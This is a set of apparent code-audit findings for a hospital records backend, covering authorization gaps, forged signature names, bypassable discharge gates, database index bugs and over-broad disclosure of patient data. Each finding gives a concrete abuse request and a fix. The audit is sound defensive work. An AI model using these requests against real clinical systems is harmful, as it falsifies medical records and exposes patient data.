It also requires no amendment reason (amendDoctorNote enforces >=5 chars at 1029-1034) and pushes nothing onto note.amendments[] — it just sets $set.status='amended' at 872-874. Worse, line 900-902 writes through `DoctorNotes.collection.updateOne()` (the raw driver), deliberately bypassing Mongoose casting, validation, and the attachStatusGuard state machine, with $set values taken verbatim from req.body.
findings.failureScenario: Dr. B (no relationship to the patient) sends PATCH /api/doctor-notes/<Dr-A's-signed-IA-id>/diagnosis with {"finalDiagnosis":"Viral fever","icd10Code":"B34.9"}. It succeeds: the signed note's finalDiagnosis is rewritten, status flips signed->amended, note.amendments[] stays EMPTY (so the print/legal view shows no amendment trail and the original attestation signedByName still reads 'Dr. A'), and the change propagates to Admission.finalDiagnosis via the sync at 947-963, which the discharge summary then auto-fills from. Separately, because the raw write skips casting, {"finalDiagnosis":{"x":1}} stores an object into a String path — the exact poison-pill corruption the R7bo-LIVE comments at 854-859/891-899 describe having already hit `updatedBy`, after which Mongoose reads/saves on that doc throw.
findings.fixSketch: Add the same isAuthor||Admin gate and reason requirement amendDoctorNote uses, push an amendments[] entry with before/after, and either route this endpoint through amendDoctorNote() or restore a Mongoose findOneAndUpdate with runValidators (fix the corrupt-updatedBy root cause with a one-off migration rather than by disabling casting for all callers forever).
findings.verifyEvidence: Every material claim checks out against the real code; I tried to refute each and could not. 1) NO OWNERSHIP CHECK — CONFIRMED. `updateDiagnosis(id, data, actor = {})` at D:\Spherehealth\Backend\services\Doctor\doctorNotesService.js:853-903 reads `before` (861), builds `$set` from the five diag fields (868-870), flips status (872-874), and uses `actor` ONLY to populate `updatedBy` (876-881) and to label the audit row (915-917). There is no `isAuthor` / `before.doctor` comparison and no role check anywhere in the function. Contrast is exact as filed: `amendDoctorNote` at 1058-1067 does `const isAuthor = before.doctor && actorId && String(before.doctor) === String(actorId); if (!isAuthor && actorRole !== "Admin") -> 403 AMEND_NOT_OWNER`. The controller does not compensate — DoctorNotesController.js:173-185 only shapes `{id, name, role}` from `req.user` and passes it straight through. The route is the only gate: doctorNotesRoutes.js:36 `router.patch("/:id/diagnosis", validateObjectIdParam("id"), requireAction("doctor-orders.write"), credentialExpiryBlocker("NMC_REG"), ctrl.updateDiagnosis)`, and config/permissions.js:147 `"doctor-orders.write": ["Admin", "Doctor"]` — i.e. ANY Doctor in the tenant, with no patient/author relationship required. BOLA confirmed. 2) NO REASON, NO amendments[] ENTRY — CONFIRMED. `amendDoctorNote` enforces reason >=5 chars at 1029-1034 (AMEND_REASON_REQUIRED) and <=1000 at 1035-1040. `updateDiagnosis` reads no `reason` at all and never touches `note.a…

findings.dimension: Clinical documentation (notes, IA, discharge summary, co-sign)
findings.title: Discharge-summary signature name is taken from req.body, defeating the co-sign separation-of-duties check
findings.mechanism: finalize() destructures `finalizedByName` from req.body (line 211) and writes it verbatim as the legal signature at line 388 (`finalizedByName: finalizedByName || 'Doctor'`). The model's server-derived `finalizedBy` ObjectId field (DischargeSummaryModel.js:153) is never populated on this path — create() strips it (86) and finalize() never sets it. So a finalized summary carries NO server-derived signer identity, only a client-supplied string. cosign()'s separation-of-duties guard (727-733) compares `req.user.fullName === existing.finalizedByName` and the code itself concedes at 724-726 that this is only a name-level guard.
findings.failureScenario: Dr. Senior (designation 'Consultant', and the attending) finalizes with body {"finalizedByName":"Dr. Resident Kumar"}. The summary now legally attests to Dr. Kumar, who never touched it. Dr. Senior then POSTs /:id/cosign: the SAME_ACTOR check at 727 compares 'Dr. Senior' vs 'Dr. Resident Kumar', does not match, and passes — so the same physician both finalizes and co-signs, collapsing the NABH COP.7 two-person control the cosign endpoint exists to enforce. The DISCHARGE_SUMMARY_FINALIZED ClinicalAudit row (429-445) also propagates the forged name into the 7-year audit trail.

Then change cosign's SAME_ACTOR guard to compare finalizedBy ObjectIds rather than display names.

findings.title: PROM/PREM discharge gate is bypassed by allowOverride with no reason required and no accurate override evidence recorded
findings.mechanism: The PROM/PREM gate is guarded by `if (draftSummary?.admissionId && !allowOverride)` at line 279 — a truthy allowOverride skips it outright. The two OTHER gates enforce a reason, but only conditionally on their own failure: the nursing-handover reason check at 317 fires only `if (!nursingDone && allowOverride && !reason)`, and the content-gate reason check at 362 only `if (missing.length && allowOverride && !reason)`. There is no equivalent reason requirement attached to the PROM/PREM bypass. Additionally, the evidence written at 393-398 is stamped under `nursingHandoverOverride*` — the model has no promPremOverride field at all (DischargeSummaryModel.js:172-181).
findings.failureScenario: A doctor whose patient completed the nursing handover and has full diagnosis/meds/follow-up sends PATCH /:id/finalize with {"allowOverride": true} and no overrideReason. nursingDone is true so the 317 check is skipped; missing[] is empty so the 362 check is skipped; the PROM/PREM check at 279 was never entered. The discharge finalizes with zero PROM and zero PREM captured, and the only trace is nursingHandoverOverride:true with nursingHandoverOverrideReason:"" — which tells a surveyor the NURSING handover was overridden (it wasn't) and gives no hint the patient-voice requirement was skipped. NABH PSQ / COP.6.b evidence is silently absent, and the override becomes a one-flag skeleton key for the whole PSQ requirement.
findings.fixSketch: Require a non-empty overrideReason whenever allowOverride is truthy (single up-front check), and record each bypassed gate under its own evidence fields — add promPremOverride/promPremOverrideReason to the model and stamp only the gates that actually failed rather than blanket-stamping nursingHandoverOverride.
findings.verifyEvidence: All three cited mechanisms verified against actual code in Backend/controllers/Clinical/dischargeSummaryController.js. 1) GATE BYPASS (line 279): `if (draftSummary?.admissionId && !allowOverride) {` — truthy allowOverride skips the entire PROM/PREM readiness block (280-297) without any reason requirement. Exactly as filed. 2) REASON ENFORCEMENT IS PER-GATE, NOT GLOBAL: line 317 `if (!nursingDone && allowOverride && !String(overrideReason || "").trim())` fires only when the NURSING gate failed; line 362 `if (missing.length && allowOverride && !String(overrideReason || "").trim())` fires only when the CONTENT gate failed. A full grep of the controller for `allowOverride|overrideReason` returns only lines 211 (destructure `const { finalizedByName, allowOverride, overrideReason } = req.body;`), 251/276/335 (comments), 279, 286, 310, 313, 317, 354, 358, 362, 370, 393, 395, 403 — confirming there is NO up-front/global reason check anywhere in finalize(). 3) MISLABELED EVIDENCE (393-398): `...(allowOverride ? { nursingHandoverOverride: true, nursingHandoverOverrideReason: String(overrideReason || "").trim(), nursingHandoverOverrideAt: new Date(), nursingHandoverOverrideBy: ... } : {})` — stamped on ANY truthy allowOverride irrespective of which gate actually tripped. DischargeSummaryModel.js:167-181 declares only nursingHandoverOverride{,Reason,At,By} and contentGateOverride{,Reason,Missing,At,By}; there is no promPremOverride field, so under Mongoose strict mode a PROM/PREM-specif…

findings.dimension: Clinical documentation (notes, IA, discharge summary, co-sign)
findings.title: Doctor-note addendum is created with status 'amended' and can never be signed, yet inherits the original note's signature identity
findings.mechanism: updateDoctorNote()'s addendum path clones the attested note, deletes signedAt at line 801 with the comment 'addendum signs later if/when the doctor signs it', and sets base.status='amended' at 810. But signDoctorNote()'s CAS at 504 matches only `{_id, status:'draft'}`, so an 'amended' doc never matches and the caller gets 409 'Note already signed by another user' at 509-513. The addendum is therefore permanently unsignable. The clone also retains signedByName/signedByReg/signedByEmpId (only signedAt and signature are stripped at 801/804), and the fan-out to TreatmentChart.addDoctorOrders + medRecon/meds/infusion/invest fan-outs only run inside signDoctorNote (519-522, 534-543) and the create-path signed branch (286-295), never on this create() call.
findings.failureScenario: Dr. A signs an IA. Dr. A then PUTs /api/doctor-notes/<id> with a corrected `orders` array (e.g. changing a medication dose). An addendum doc is created with status 'amended', isAddendum:true, signedByName still 'Dr. A' and signedByReg still Dr. A's MCI number — so the printed chart shows an attested-looking note that no one ever signed and that carries no signedAt. Dr. A then PATCHes /<addendumId>/sign to attest it and gets a misleading 409 'Note already signed by another user'. The corrected dose never reaches TreatmentChart/MAR, so the nurse keeps administering the old dose from the original signed note while the chart displays the corrected one. The addendum path also requires no reason at all, unlike POST /:id/amend (1029-1034).
findings.fixSketch: Set base.status='draft' on the addendum (matching nurseNotesService.js:478, which gets this right) and strip signedByName/signedByReg/signedByEmpId/handoverFromName from the clone so it renders as unsigned until actually attested; or deprecate the PUT-on-signed addendum path entirely and force callers to POST /:id/amend, which already enforces reason + ownership + amendments[].
findings.verifyEvidence: MECHANISM CONFIRMED at doctorNotesService.js:795-833 — the addendum clone deletes signedAt (802) and unsets signature (804) but retains signedByName/signedByReg/signedByEmpId/handoverFromName, sets base.status="amended" (809), and inserts via raw DoctorNotes.create(base) (816). signDoctorNote's CAS at 504-505 is findOneAndUpdate({_id, status:"draft"}), so an "amended" doc never matches and the caller gets the misleading 409 "Note already signed by another user" (509-513) — the clearer 400 at 348-352 only fires for status==="signed". The addendum is therefore permanently unsignable. Fan-outs (TreatmentChart.addDoctorOrders 519-522; medRecon/meds/infusion/invest 534-543) run only inside signDoctorNote, never on the create() at 816, and DoctorNotesModel.js:403-407 getAllPendingOrders filters status:"signed", so the addendum's orders never reach the nurse queue or the chart. No reason is required, unlike amendDoctorNote (1029-1034). FAILURE SCENARIO REFUTED. The cited IA scenario cannot occur: DoctorNotesModel.js:349-395 is a pre("save") hook that fires on `isNew && noteType === "initial"` and rejects with 409 DUPLICATE_INITIAL_ASSESSMENT when an existing IA shares the same admission+section. Model.create() runs save hooks, so DoctorNotes.create(base) for an IA addendum throws before insert (base.noteType stays "initial" via `base.noteType || "amendment"` at 810). The partial-unique indexes uniq_initial_per_admission_section / uniq_initial_per_ipdNo_section (314-331) back-stop i…

findings.title: Mortality register: sparse-unique index on `admissionId` (default null) silently drops every non-admitted death after the first
findings.mechanism: `admissionId: { type: ObjectId, ref: 'Admission', default: null }` (line 41) means the field is ALWAYS present on every document — explicitly `null` when there is no admission. The idempotency index is declared `{ admissionId: 1 }, { unique: true, sparse: true }` (lines 132-135). MongoDB's `sparse` only omits documents that are MISSING the key; a document with the key set to `null` IS indexed. So exactly ONE mortality row with `admissionId: null` can ever exist in the collection. `emitMortality` takes the `else` branch when `admId` is falsy (line 1592, dedupes on `sourceRef` only), then `create({ admissionId: admId /* null */ ... })` (line 1624). The resulting E11000 is swallowed by `if (e?.code === 11000) return null;` (line 1701) — the emitter is best-effort so nothing surfaces to the caller. Contrast the correct pattern used elsewhere in this codebase: `DoctorNotesModel.js:315-321` uses `partialFilterExpression: { admissionId: { $type: 'objectId' } }` precisely to exclude nulls.
findings.failureScenario: A death note is filed for a patient who was never admitted (ER/casualty death, brought-in-dead, OPD collapse). `doctorNotesService.js:303-324` builds `deathNoteForEmit.admissionId = note.admissionId`, which is `null` (DoctorNotesModel.js:79 — `admissionId` is optional, `default: null`). First such death: MortalityRegister row is created with `admissionId: null`, claiming the single null slot in the unique index. Second such death (different patient, months later): `MortalityRegister.findOne({ sourceRef: deathNote._id })` finds nothing → `create()` → E11000 on `uniq_mortality_admission` → caught at line 1701 → `return null`. No row, no 500, only `[doctorNotes] emitMortality error` is never even logged (the emitter returns null rather than throwing). Every subsequent non-admitted death in the hospital's lifetime is permanently absent from the NABH COP.18 mortality register, the monthly mortality-review committee worklist, and `GET /registers/nabh/mortality-register`.
findings.fixSketch: Replace the sparse-unique index with a partial one that excludes nulls, mirroring DoctorNotesModel: `MortalityRegisterSchema.index({ admissionId: 1 }, { unique: true, partialFilterExpression: { admissionId: { $type: 'objectId' } }, name: 'uniq_mortality_admission' })`. Add a unique partial index on `sourceRef` (`{ $type: 'string', $gt: '' }`, as SentinelEventRegisterModel.js:93-96 already does) so the no-admission path keeps a real idempotency key. Drop + rebuild the old index in a migration.
findings.verifyEvidence: MECHANISM CONFIRMED EXACTLY AS DESCRIBED. Verified line-by-line: 1. MortalityRegisterModel.js:41 — `admissionId: { type: Schema.Types.ObjectId, ref: "Admission", default: null, index: true }`. The `default: null` guarantees the key is PRESENT (value null) on every document. 2. MortalityRegisterModel.js:132-135 — `index({ admissionId: 1 }, { unique: true, sparse: true, name: "uniq_mortality_admission" })`. MongoDB `sparse` omits only documents MISSING the key; a document with the key explicitly set to `null` IS indexed (key value null). Therefore exactly ONE row with admissionId:null can exist collection-wide. 3. nabhRegisterEmitter.js:1586 — `admId = admission?._id || dischargeSummary?.admissionId || deathNote?.admissionId || null`; :1592-1594 else-branch dedupes on `sourceRef` only; :1624 — `create({ admissionId: admId })` writes null. 4. nabhRegisterEmitter.js:1700-1701 — `if (e?.code === 11000) return null;` executes BEFORE the console.error at :1702, so the E11000 is fully silent (auditor's "not even logged" claim is accurate). Callers use `.catch()` on a best-effort emit, so nothing surfaces. 5. Index materialisation confirmed: no `autoIndex: false` / `mongoose.set('autoIndex')` anywhere in Backend (grep clean) → Mongoose default autoIndex:true builds it in all envs. No migration references `uniq_mortality_admission` (grep found only the model definition). 6. Contrast pattern verified and is damning: DoctorNotesModel.js:314-325 uses `partialFilterExpression: { noteType:…

findings.title: emitPressureUlcer mints a NEW sentinel event on every pressure-area assessment of the same HAPU (the #47 fall fix was never applied here)
findings.mechanism: `emitPressureUlcer` has NO find-or-create guard — it unconditionally `PressureUlcerRegister.create(...)` (line 756) for every incoming NursingAssessment, so `row._id` is fresh on every save. The sentinel chain then keys idempotency off that fresh id: `sourceRef: `PressureUlcer:${row._id}`` (line 800). `emitSentinelEvent` is find-or-create BY sourceRef (line 2227), so a per-save-unique sourceRef defeats it entirely. `sentinel` (line 742) is derived from re-asserted form state — `hospitalAcquired && ['III','IV','Unstageable','DTI'].includes(ulcerStage)` — not from a per-incident id. This is exactly the defect R8-FIX(#47) fixed for falls (lines 656-675 introduced a stable `data.fallEventId` key); the identical HAPU path was left on the old `Register:${row._id}` shape.
findings.failureScenario: Patient has a hospital-acquired stage-IV sacral ulcer. `PressureAreaCarePage.jsx` keeps `ulcerPresent/ulcerStage/hospitalAcquired` in a `useAutoSave` draft (line 204) and restores them on mount (lines 227-228), so every q-shift Braden reassessment re-POSTs `hospitalAcquired: true, ulcerStage: 'IV'`. `nursingAssessmentsRoutes.js:53` creates a fresh NursingAssessment each time → `emitFromNursingAssessment` → `emitPressureUlcer` → new PressureUlcerRegister row → new `PressureUlcer:<new _id>` sourceRef → emitSentinelEvent finds no match → **a new `HAPU-stage3-4` SentinelEventRegister row per shift**. Over a 3-week admission with 2 assessments/day that is ~42 sentinel events for ONE ulcer. If callers use `emitSentinelEventWithRCA` (line 2774) each also pre-creates an RCA. The NABH QPS sentinel count reported to leadership/surveyors is inflated ~40x and the Quality officer's RCA worklist is flooded with duplicates of one incident.
findings.fixSketch: Mirror the #47 pattern: mint a stable per-ulcer incident id client-side (`hapuEventId`) and prefer it; fall back to a content-stable deterministic key scoped to the ulcer, not the row — e.g. `PressureUlcer:${data.hapuEventId}` else `PressureUlcer:${canonicalAdmissionId || assessment.UHID}:${data.ulcerSite || 'site'}:${ulcerStage}`. Never key an idempotency ref off an `_id` that is regenerated per save.
findings.verifyEvidence: The defect is exactly as described; I tried to break each link in the chain and all held. 1. UNCONDITIONAL CREATE — `Backend/services/Compliance/nabhRegisterEmitter.js:756`: `const row = await PressureUlcerRegister.create({...})`. No findOne/upsert/find-or-create guard anywhere in `emitPressureUlcer` (727-813). `row._id` is therefore fresh on every invocation. Confirmed. 2. SENTINEL GATE IS RE-ASSERTED FORM STATE, NOT AN INCIDENT ID — line 742: `const sentinel = hospitalAcquired && ["III","IV","Unstageable","DTI"].includes(ulcerStage);` derived from `data.hospitalAcquired` (740) and `data.ulcerStage` (739). Confirmed. 3. SOURCEREF KEYED OFF THE FRESH ROW — line 800: `sourceRef: `PressureUlcer:${row._id}``. Unique per save. Confirmed. 4. IDEMPOTENCY IS BY SOURCEREF, SO IT IS DEFEATED — `emitSentinelEvent` line 2223 `const sourceRef = payload.sourceRef || _crypto.randomUUID();` then line 2227 `const existing = await SentinelEventRegister.findOne({ sourceRef }).lean(); if (existing) return existing;`. A per-save-unique key never matches → falls through to `SentinelEventRegister.create` (2236). The R8-FIX(#47) unique partial index (`SentinelEventRegisterModel.js:93-96`) does NOT save it either — each key is genuinely distinct, so no E11000 fires. Confirmed. 5. THE #47 ASYMMETRY IS REAL — `emitFallRisk` lines 656-675 build a STABLE key: `_incidentId ? `FallRisk:${_incidentId}` : `FallRisk:${_fallScope}:${_fallStamp}`` with an explicit comment that the old `FallRisk:${row._id}` "m…

findings.title: R8-FIX(#47) sentinel E11000 race handler is dead code — `sourceRef` is block-scoped to the `try`, so the catch throws ReferenceError and still returns null
findings.mechanism: `const sourceRef = payload.sourceRef || _crypto.randomUUID();` is declared at line 2223 INSIDE the `try` block. The `catch (e)` block at 2269 is a sibling lexical scope — the `const` is not visible there. The E11000 handler `try { return await SentinelEventRegister.findOne({ sourceRef }).lean(); } catch (_) { return null; }` (lines 2274-2275) therefore evaluates `{ sourceRef }` → `ReferenceError: sourceRef is not defined`, which is immediately caught by its own inner `catch (_)` and converted to `return null`. The stated fix ('was `return null`, which silently dropped the caller's reference to the existing sentinel') is inert: the function still returns null on every race, with no error visible anywhere.
findings.failureScenario: Two concurrent emits share a sourceRef — e.g. an axios retry of the same fall POST, or two nurses' devices submitting the same `fallEventId`. Both pass `findOne({ sourceRef })` (line 2227) with no hit, both `create()`; the loser hits the unique partial index added at SentinelEventRegisterModel.js:93-96 → E11000 → catch → ReferenceError → swallowed → `return null`. In `emitMedicationError` (lines 2509-2528) the caller does `if (sentinelRow?._id) { row.sentinelEventRef = sentinelRow._id; await row.save(); }` — with null returned, the MedicationErrorRegister row's `sentinelEventRef` is left `null` even though a sentinel row EXISTS in the database. The two NABH MOM.4 registers are then silently un-cross-referenced, which is precisely the linkage a surveyor traces. Same for any caller relying on the returned row (e.g. `emitSentinelEventWithRCA` at 2775-2776 skips the RCA bootstrap entirely on a null return).
findings.fixSketch: Hoist the key out of the try: `let sourceRef = null;` before `try {`, then `sourceRef = payload.sourceRef || _crypto.randomUUID();` inside. Same latent pattern to check in `emitHandHygiene` (2302), `emitMedicationError` (2451), `emitHAISurveillance` (2824) — those catches don't reference it today, but `emitLAMA` (2657-2659) recomputes the key defensively in the catch, which is the pattern to follow.
findings.verifyEvidence: MECHANISM CONFIRMED EXACTLY. nabhRegisterEmitter.js:2219 opens `try`; :2223 declares `const sourceRef = payload.sourceRef || _crypto.randomUUID();` INSIDE it. The `catch (e)` at :2269 is a sibling lexical scope, so the R8-FIX(#47) handler at :2273-2276 — `if (e?.code === 11000) { try { return await SentinelEventRegister.findOne({ sourceRef }).lean(); } catch (_) { return null; } }` — evaluates `{ sourceRef }` and throws ReferenceError, which its own inner `catch (_)` converts to `return null` with NO log. Verified no rescue binding: grepped every `sourceRef` in the file; within emitSentinelEvent (2218-2281) line 2223 is the only one — no module-scope or var-hoisted shadow. Empirically reproduced the exact code shape under node: "INNER CATCH SWALLOWED -> ReferenceError: sourceRef is not defined / result = null". The fix comment ("was `return null` ... now returns the row it created") is therefore inert dead code. CORRECTION TO THE FILED FAILURE SCENARIO (scenario partly wrong, defect still real): the cited emitMedicationError chain (2509-2528) is NOT reachable — its key is `MedicationError:${row._id}:${severity}` (:2521), derived from a freshly-created row per call, so concurrent emits mint DIFFERENT keys and never hit E11000; the claimed un-cross-referenced MOM.4 registers cannot occur that way. Same for emitPressureUlcer (:800, `PressureUlcer:${row._id}`). emitFallRisk (:676) DOES use a stable key (`FallRisk:${fallEventId}`, :673-675) but discards the return value, so null…

findings.title: Fall sentinel idempotency key is client-supplied and unscoped to the patient — a replayed `fallEventId` silently suppresses a second patient's Fall-with-Major-Injury sentinel
findings.mechanism: R8-FIX(#47) makes the sentinel sourceRef `FallRisk:${data.fallEventId}` where `data.fallEventId` comes straight off `assessment.data` — i.e. the unvalidated request body folded in by `nursingAssessmentsRoutes.js:52-61` (`const { UHID, patientName, admissionId, recordedBy, ...rest } = req.body; ... data: rest`). It is minted client-side by `FallRiskAssessmentPage.jsx:203-204` (`window.crypto.randomUUID()` with a `fall-${Date.now()}-${Math.random()}` fallback) and is never validated, never format-checked, and never bound to the patient. `emitSentinelEvent` then does `SentinelEventRegister.findOne({ sourceRef }).lean(); if (existing) return existing;` (2227-2228) with NO check that `existing.UHID === payload.UHID`. The in-code comment at 664-666 asserts 'being an opaque UUID it can never collide across patients or tenants' — that assumption holds only if the server mints it, which it does not.
findings.failureScenario: Any holder of `vitals.write` (Nurse/Doctor — the broadest clinical tier) POSTs to `/api/nursing-assessments/fall-risk` for patient B with `fallOccurred: true, injurySeverity: 'Major'`, `score: 50`, and `fallEventId` set to a value already used by patient A's earlier fall. `emitFallRisk` builds `FallRisk:<that id>`, `emitSentinelEvent` finds patient A's existing row and returns it — patient B's fall-with-major-injury NEVER gets a SentinelEventRegister row, so it is absent from the QPS sentinel register, the RCA worklist, and the surveyor's NABH AAC.7/PSQ evidence, while the FallRiskRegister row (line 623) is written normally so the record looks complete. The same happens accidentally with the non-UUID fallback path (`fall-${Date.now()}-${Math.random()}`) or any non-UI producer, and the fallback key at line 675 (`FallRisk:${admission||UHID}:${fallDate}`) additionally collapses two genuine same-day falls into one sentinel.
findings.fixSketch: Namespace the key server-side so a client value can never reach another patient's row: `FallRisk:${assessment.UHID}:${sanitize(data.fallEventId)}`, and validate the id shape (UUIDv4 regex, reject otherwise). Belt-and-braces: in `emitSentinelEvent`, when an existing row is found by sourceRef, verify `existing.UHID === payload.UHID` and treat a mismatch as a new event (log it as a suspected key collision) rather than returning the foreign row.
findings.verifyEvidence: Core mechanism confirmed verbatim at both cited locations, and the data-flow claim holds end-to-end. 1) KEY CONSTRUCTION — nabhRegisterEmitter.js:669-675 is exactly as described:    const _incidentId = String(data.fallEventId || "").trim();    const _sentinelSourceRef = _incidentId ? `FallRisk:${_incidentId}` : `FallRisk:${_fallScope}:${_fallStamp}`;    The primary key is the raw client value with NO UHID namespace, no format check, no sanitisation. 2) SUPPRESSION — emitSentinelEvent (2227-2228): `const existing = await SentinelEventRegister.findOne({ sourceRef }).lean(); if (existing) return existing;` — no `existing.UHID === payload.UHID` comparison. Confirmed. 3) CLIENT-SUPPLIED + UNVALIDATED — confirmed, though the finding's route path is slightly wrong: the file is Backend/routes/Nurse/nursingAssessmentsRoutes.js (not Backend/nursingAssessmentsRoutes.js), but the cited lines 52-61 are exact: `const { UHID, patientName, admissionId, recordedBy, ...rest } = req.body || {}; ... data: rest` under `requireAction("vitals.write")`. NursingAssessment.data is a free-form fold of the body — fallEventId is never validated anywhere. Minted client-side at Frontend/src/pages/nursing/FallRiskAssessmentPage.jsx:203-204 via `window.crypto?.randomUUID?.() || \`fall-${Date.now()}-${Math.random().toString(36).slice(2)}\``, spread into the POST at line 271. The in-code comment at 664-666 ("being an opaque UUID it can never collide across patients or tenants") is a false premise — the server…

findings.title: MAR-originated medication errors lose the reporting user's id — caller passes `{byUserId}` but `_actor()` only reads `_id/id/userId`
findings.mechanism: The administer route passes `actor: { byUserId: req.user?._id || req.user?.id, byName: givenBy, byRole: req.user?.role }` (line 1604). `_actor()` (nabhRegisterEmitter.js:77-83) resolves the id via `actor._id || actor.id || actor.userId || null` — `byUserId` is NOT in that list, so `actorMeta.byUserId` is always `null` on this path (byName/byRole survive because `_actor` does accept `actor.byName`/`actor.byRole`). The register write at line 2485 then stores `reportedByUserId: _asObjectId(actorMeta.byUserId)` → `null`, and every `auditTrail` entry spread with `...actorMeta` carries `byUserId: null`. `reportedByEmpId: error.reportedByEmpId || actor.empId || ''` (line 2483) is likewise `''` since the literal has no `empId`.
findings.failureScenario: A nurse records a dose via `POST /api/doctor-orders/:id/administer` with `nurseError: true, errorDetails.severityNCC: 'F'`. A MedicationErrorRegister row is created with `reportedByUserId: null`, `reportedByEmpId: ''`, and a CREATED + ESCALATED audit trail whose `byUserId` is null — only the free-text `givenBy` string identifies the reporter. The chained sentinel (line 2516) gets `discoveredByEmpId` falling back to the same free-text name. A surveyor (or a subsequent RCA) auditing an NCC-F medication error cannot join the register row back to a User account, and the row's `createdBy`-equivalent attribution is unverifiable free text that the same nurse controls.
findings.fixSketch: Either pass `actor: req.user` at doctorOrderRoutes.js:1604 (the shape every other emit call site uses — see nabhRegisterEmitter.js:1604's siblings) and let `_actor` do the work, or extend `_actor` to also accept `actor.byUserId`: `byUserId: actor._id || actor.id || actor.userId || actor.byUserId || null`. The latter is safer since it fixes any other call site using the `by*` shape.
findings.verifyEvidence: Every cited location matches the claim. doctorOrderRoutes.js:1604 passes `actor: { byUserId: req.user?._id || req.user?.id, byName: givenBy, byRole: req.user?.role }`. nabhRegisterEmitter.js:77-83 `_actor()` resolves `byUserId: actor._id || actor.id || actor.userId || null` — `byUserId` is NOT in that chain, so it resolves to null. `byName` (line 80: `actor.fullName || actor.name || actor.byName`) and `byRole` (line 81: `actor.role || actor.byRole`) DO survive, exactly as the finding states. Downstream: nabhRegisterEmitter.js:2485 `reportedByUserId: _asObjectId(actorMeta.byUserId)` → `_asObjectId(null)` returns null (line 93 `if (!v) return null`). Lines 2492-2502 spread `...actorMeta` into the CREATED and (severity E-I) ESCALATED auditTrail entries → both carry `byUserId: null`. MedicationErrorRegisterModel.js:64 `reportedByUserId: { type: ObjectId, ref: "User", default: null }` is not required, and the auditTrail subdoc byUserId (line 19) is nullable; no pre-save hook backfills. So the write succeeds silently with null attribution — a data-integrity gap, not a crash. auth.js:146 `req.user = { ...decoded, _id: decoded.id }` confirms req.user._id genuinely exists, so the caller's intent to persist the id is unambiguous and the value is dropped purely by shape mismatch. Grep confirms the anomaly claim: `actor:\s*\{[^}]*byUserId` matches exactly ONE line in the entire Backend (doctorOrderRoutes.js:1604), while `actor: req.user` appears 53 times across 28 files, including 8 oth…

findings.title: Consent hiTypes are cosmetic — every HI Type ships the patient's ENTIRE clinical file
findings.mechanism: buildAbdmDocumentBundle() uses opts.hiType ONLY to pick the Composition.type SNOMED coding and title (line 63/92). The actual payload is `buildBundle(file, hospital)` (line 60) — the fhirExporter (Backend/services/Clinical/fhirExporter.js:389-469) receives no hiType and unconditionally emits doctorNotes, doctorOrders, investigations AND dischargeSummary as resources, which are then spread verbatim into the document Bundle at line 115. So the bundle content is byte-identical for hiType="Prescription" and hiType="DischargeSummary". Worse, buildEncryptedTransfer loops `for (const hiType of hiTypes)` (abdmDataFlowService.js:106) and calls buildBundleForCareContext per type, producing N *identical* full-file bundles that are each encrypted and pushed as separate entries.
findings.failureScenario: A patient grants an insurer HIU a consent with hiTypes:["Prescription"] for care context CC-ADM123. healthInfoHipRequest → pushHealthInformation → buildEncryptedTransfer builds one bundle labelled "Prescription" that in fact contains the Condition/diagnosis list, the discharge summary DocumentReference, and all DiagnosticReport lab results for that admission. The HIU legitimately decrypts and stores HIV/psychiatric diagnoses the patient never consented to disclose. If the consent were hiTypes:["Prescription","DiagnosticReport","OPConsultation"], three identical full-file copies are encrypted and pushed (3x PHI volume, 3x ciphertext under the same ECDH key).
findings.fixSketch: Thread hiType into the assembly, not just the Composition: give assembleFile/buildBundle an allowlist of resource families per HI Type (Prescription → MedicationRequest only; DiagnosticReport → DiagnosticReport/Observation; DischargeSummary → discharge docs), filter `entries` in buildAbdmDocumentBundle by that allowlist before spreading at line 115, and skip an hiType entirely when the filtered set is empty rather than emitting a duplicate full file.
findings.verifyEvidence: Every cited line checks out and the mechanism is exactly as described. 1) Backend/services/Abdm/abdmFhirR4.js:60 — `const collection = buildBundle(file, hospital);` passes NO hiType. 2) Backend/services/Clinical/fhirExporter.js:389 — signature is `function buildBundle(file, hospital = {})`. There is no third param, no allowlist, no filtering hook. Lines 427-479 unconditionally push: buildCondition + buildDocumentReference per doctorNote (427-430); vitals Observations (432-441); buildMedicationRequest/buildMedicationAdministration per medication order (443-448); buildDiagnosticReport + buildLabObservation per investigation (452-461); and the whole discharge cluster — buildDischargeCondition (coded diagnoses), buildDischargeMedication, buildProcedure, buildFollowUpCarePlan (471-479). 3) abdmFhirR4.js:63 `const hiType = HI_TYPE_META[opts.hiType] ? opts.hiType : _derive(file);` → used ONLY at :92 (`type: { coding: [{ ... code: meta.code, display: meta.display }], text: meta.title }`) and :100 (`title: meta.title`). No other consumer of hiType exists in the file. 4) abdmFhirR4.js:115 — `entry: [compositionEntry, ...entries]` spreads the unfiltered collection verbatim. Per-hiType variance is limited to the Composition's SNOMED coding/title; all clinical resources are identical. 5) Backend/services/Abdm/abdmDataFlowService.js:28-67 — `assembleFile(uhid, admissionId, dateRange)` has no hiType parameter; the R8-FIX(#1) dateRange clause is threaded through but all four families (docto…

findings.title: Care-context scoping is not applied to doctor orders / investigations — whole-UHID history is disclosed
findings.mechanism: assembleFile() scopes doctorNotes by `admissionId: currentAdmission._id` (line 48) and dischargeSummary by admissionId (line 61), but DoctorOrder is queried as `{ UHID: UH, ...dateClause("orderedAt") }` (line 51) and InvestigationOrder as `{ UHID: UH, ...dateClause("createdAt") }` (line 55) — neither is filtered by the care context's admissionId, even though both models carry one (DoctorOrderModel.js:208, InvestigationOrderModel.js:158). The only bound left is the consent dateRange, and `dateClause` returns `{}` when the range is absent/open-ended (line 41), so an artefact with no dateRange yields a completely unfiltered `{UHID}` query capped only by `.limit(500)`.
findings.failureScenario: Patient UHID BIMS0042 has 6 admissions linked as 6 care contexts. She consents to disclose ONLY care context CC-ADM2021-07 (a 2021 orthopaedic visit) with permission.dateRange omitted by the CM. buildEncryptedTransfer resolves that single care context, but assembleFile returns every DoctorOrder and InvestigationOrder ever raised for BIMS0042 — including her 2024 oncology chemo orders and HIV ELISA investigation — and fhirExporter packs all of them into the bundle pushed to the HIU. The patient consented to one visit and disclosed five others.
findings.fixSketch: Pass currentAdmission._id into the order/investigation queries: `DoctorOrder.find({ UHID: UH, admissionId: currentAdmission._id, ...dateClause('orderedAt') })` and likewise for InvestigationOrder; fall back to UHID-scoped only for genuinely encounter-less OPD care contexts, and fail closed (empty file) rather than open when the care context has no resolvable admission.
